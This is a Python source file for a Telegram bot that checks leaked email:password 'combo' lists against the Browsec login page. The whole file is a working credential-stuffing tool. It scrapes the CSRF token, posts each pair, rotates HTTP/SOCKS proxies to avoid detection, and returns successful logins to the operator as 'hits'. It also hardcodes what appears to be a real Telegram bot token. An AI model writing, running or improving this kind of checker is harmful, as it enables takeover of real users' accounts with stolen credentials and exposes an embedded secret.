import telebot
import requests
from bs4 import BeautifulSoup
import time
import itertools

TOKEN = '8072279299:AAH5u2FLs5jVEP_MjJ8uoAGI9bp0_cmabg8'
bot = telebot.TeleBot(TOKEN)

LOGIN_URL = 'https://browsec.com/en/login'

# User states and data storage
user_states = {}
# Structure example:
# user_states[user_id] = {
#   'status': 'waiting_combo' / 'waiting_proxy_type' / 'waiting_proxy_file' / 'checking' / 'stopped',
#   'combo_lines': [...],
#   'proxy_type': None,
#   'proxy_lines': [...],
#   'proxy_cycle': iterator,
# }

def reset_user_state(user_id):
    user_states[user_id] = {
        'status': 'waiting_combo',
        'combo_lines': [],
        'proxy_type': None,
        'proxy_lines': [],
        'proxy_cycle': None,
        'checking_msg_id': None,
        'checking_chat_id': None,
        'checked': 0,
        'hits': 0,
        'failures': 0,
        'retries': 0,
        'stop_flag': False,
    }

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    reset_user_state(user_id)
    bot.reply_to(message, "Send me a .txt file with email:password on each line to check Browsec accounts.")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    user_id = message.from_user.id
    if user_id in user_states:
        user_states[user_id]['stop_flag'] = True
        user_states[user_id]['status'] = 'stopped'
        bot.reply_to(message, "Checking stopped. Send /start to begin again.")
    else:
        bot.reply_to(message, "Nothing is running. Send /start to begin.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id not in user_states:
        bot.reply_to(message, "Please send /start first.")
        return

    state = user_states[user_id]

    if state['status'] == 'waiting_combo':
        # Receive combo file
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
        if not lines:
            bot.reply_to(message, "The combo file is empty or invalid. Please send a valid .txt file with email:password lines.")
            return
        state['combo_lines'] = lines
        state['status'] = 'waiting_proxy_type'
        bot.reply_to(message,
                     "Add Proxy file.\n"
                     "/http if you want to send http proxy type\n"
                     "/socks4 if you want to send socks4 proxy type\n"
                     "/socks5 if you want to send socks5 proxy type\n\n"
                     "Send one of these commands to choose proxy type or send /noproxy to skip proxy and start checking without proxy.")
    elif state['status'] == 'waiting_proxy_file':
        # Receive proxy file
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        if not lines:
            bot.reply_to(message, "The proxy file is empty or invalid. Please send a valid proxy list or /noproxy to skip.")
            return
        state['proxy_lines'] = lines
        # Create infinite cycle iterator for proxies
        state['proxy_cycle'] = itertools.cycle(state['proxy_lines'])
        state['status'] = 'checking'
        bot.reply_to(message, "Starting checking with proxies...")
        bot.send_message(message.chat.id, "You can send /stop anytime to stop checking.")
        # Start checking in a new thread or async task to avoid blocking
        import threading
        threading.Thread(target=check_accounts, args=(message.chat.id, user_id), daemon=True).start()
    else:
        bot.reply_to(message, "I am not expecting a file now. Please follow instructions or send /stop and /start.")

@bot.message_handler(commands=['http', 'socks4', 'socks5', 'noproxy'])
def handle_proxy_type(message):
    user_id = message.from_user.id
    if user_id not in user_states:
        bot.reply_to(message, "Please send /start first.")
        return
    state = user_states[user_id]

    if state['status'] != 'waiting_proxy_type':
        bot.reply_to(message, "I am not expecting proxy type now. Please follow instructions or send /stop and /start.")
        return

    cmd = message.text.lower()
    if cmd == '/noproxy':
        # No proxy, start checking directly
        state['proxy_type'] = None
        state['proxy_lines'] = []
        state['proxy_cycle'] = None
        state['status'] = 'checking'
        bot.reply_to(message, "Starting checking without proxy...")
        bot.send_message(message.chat.id, "You can send /stop anytime to stop checking.")
        import threading
        threading.Thread(target=check_accounts, args=(message.chat.id, user_id), daemon=True).start()
        return

    proxy_type_map = {
        '/http': 'http',
        '/socks4': 'socks4',
        '/socks5': 'socks5',
    }

    if cmd not in proxy_type_map:
        bot.reply_to(message, "Invalid proxy type command. Please send one of /http, /socks4, /socks5 or /noproxy.")
        return

    state['proxy_type'] = proxy_type_map[cmd]
    state['status'] = 'waiting_proxy_file'
    bot.reply_to(message, f"Send me your .txt proxy file for {state['proxy_type']} proxies, one proxy per line.")

def check_accounts(chat_id, user_id):
    state = user_states.get(user_id)
    if not state:
        return

    combo_lines = state['combo_lines']
    total = len(combo_lines)
    checked = 0
    hits = 0
    failures = 0
    retries = 0

    # Send initial progress message
    progress_msg = bot.send_message(chat_id,
                                   f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}\nRetry = {retries}")
    state['checking_msg_id'] = progress_msg.message_id
    state['checking_chat_id'] = chat_id

    session = requests.Session()

    for line in combo_lines:
        if user_states[user_id]['stop_flag']:
            bot.send_message(chat_id, "Checking stopped by user.")
            state['status'] = 'stopped'
            return

        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()

        while True:
            if user_states[user_id]['stop_flag']:
                bot.send_message(chat_id, "Checking stopped by user.")
                state['status'] = 'stopped'
                return

            # Get authenticity_token
            try:
                resp = session.get(LOGIN_URL, timeout=15)
                soup = BeautifulSoup(resp.text, 'html.parser')
                token_input = soup.find("input", {"name": "authenticity_token"})
                if not token_input:
                    bot.edit_message_text("Failed to get authenticity_token from login page.",
                                          chat_id, state['checking_msg_id'])
                    state['status'] = 'stopped'
                    return
                token = token_input.get("value")
            except Exception:
                retries += 1
                update_progress(user_id)
                time.sleep(7)
                continue

            payload = {
                "authenticity_token": token,
                "email": email,
                "user[password]": password
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": LOGIN_URL,
                "User-Agent": "Mozilla/5.0"
            }

            proxies = None
            if state['proxy_type'] and state['proxy_cycle']:
                proxy = next(state['proxy_cycle'])
                proxy_url = f"{state['proxy_type']}://{proxy}"
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url,
                }

            try:
                post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
                text = post_resp.text
            except Exception:
                retries += 1
                update_progress(user_id)
                time.sleep(7)
                continue

            if "Sign out" in text:
                hits += 1
                checked += 1
                bot.send_message(chat_id,
                                 f"browsec Hits\n\n{email}:{password}")
                update_progress(user_id)
                break
            elif ("Incorrect password/email" in text) or ("Param is missing or the value is empty" in text):
                failures += 1
                checked += 1
                update_progress(user_id)
                break
            else:
                retries += 1
                update_progress(user_id)
                time.sleep(7)

        time.sleep(7)

    bot.send_message(chat_id, "Checking completed.")
    state['status'] = 'stopped'

def update_progress(user_id):
    state = user_states.get(user_id)
    if not state or not state['checking_msg_id'] or not state['checking_chat_id']:
        return
    try:
        bot.edit_message_text(
            f"Checked = {state['checked']}/{len(state['combo_lines'])}\n"
            f"Hits = {state['hits']}\n"
            f"Failure = {state['failures']}\n"
            f"Retry = {state['retries']}",
            state['checking_chat_id'],
            state['checking_msg_id']
        )
    except Exception:
        # Message might be deleted or edited too fast - ignore
        pass

# Override counters update inside check_accounts to update state counters
def update_counters(user_id, checked=None, hits=None, failures=None, retries=None):
    state = user_states.get(user_id)
    if not state:
        return
    if checked is not None:
        state['checked'] = checked
    if hits is not None:
        state['hits'] = hits
    if failures is not None:
        state['failures'] = failures
    if retries is not None:
        state['retries'] = retries

# Patch check_accounts to update counters in state before updating progress
def patched_check_accounts(chat_id, user_id):
    state = user_states.get(user_id)
    if not state:
        return

    combo_lines = state['combo_lines']
    total = len(combo_lines)
    checked = 0
    hits = 0
    failures = 0
    retries = 0

    progress_msg = bot.send_message(chat_id,
                                   f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}\nRetry = {retries}")
    state['checking_msg_id'] = progress_msg.message_id
    state['checking_chat_id'] = chat_id

    session = requests.Session()

    for line in combo_lines:
        if user_states[user_id]['stop_flag']:
            bot.send_message(chat_id, "Checking stopped by user.")
            state['status'] = 'stopped'
            return

        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()

        while True:
            if user_states[user_id]['stop_flag']:
                bot.send_message(chat_id, "Checking stopped by user.")
                state['status'] = 'stopped'
                return

            try:
                resp = session.get(LOGIN_URL, timeout=15)
                soup = BeautifulSoup(resp.text, 'html.parser')
                token_input = soup.find("input", {"name": "authenticity_token"})
                if not token_input:
                    bot.edit_message_text("Failed to get authenticity_token from login page.",
                                          chat_id, state['checking_msg_id'])
                    state['status'] = 'stopped'
                    return
                token = token_input.get("value")
            except Exception:
                retries += 1
                update_counters(user_id, retries=retries)
                update_progress(user_id)
                time.sleep(7)
                continue

            payload = {
                "authenticity_token": token,
                "email": email,
                "user[password]": password
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": LOGIN_URL,
                "User-Agent": "Mozilla/5.0"
            }

            proxies = None
            if state['proxy_type'] and state['proxy_cycle']:
                proxy = next(state['proxy_cycle'])
                proxy_url = f"{state['proxy_type']}://{proxy}"
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url,
                }

            try:
                post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
                text = post_resp.text
            except Exception:
                retries += 1
                update_counters(user_id, retries=retries)
                update_progress(user_id)
                time.sleep(7)
                continue

            if "Sign out" in text:
                hits += 1
                checked += 1
                update_counters(user_id, checked=checked, hits=hits)
                bot.send_message(chat_id,
                                 f"browsec Hits\n\n{email}:{password}")
                update_progress(user_id)
                break
            elif ("Incorrect password/email" in text) or ("Param is missing or the value is empty" in text):
                failures += 1
                checked += 1
                update_counters(user_id, checked=checked, failures=failures)
                update_progress(user_id)
                break
            else:
                retries += 1
                update_counters(user_id, retries=retries)
                update_progress(user_id)
                time.sleep(7)

        time.sleep(7)

    bot.send_message(chat_id, "Checking completed.")
    state['status'] = 'stopped'

# Use the patched version with counters updates
check_accounts = patched_check_accounts

bot.infinity_polling()
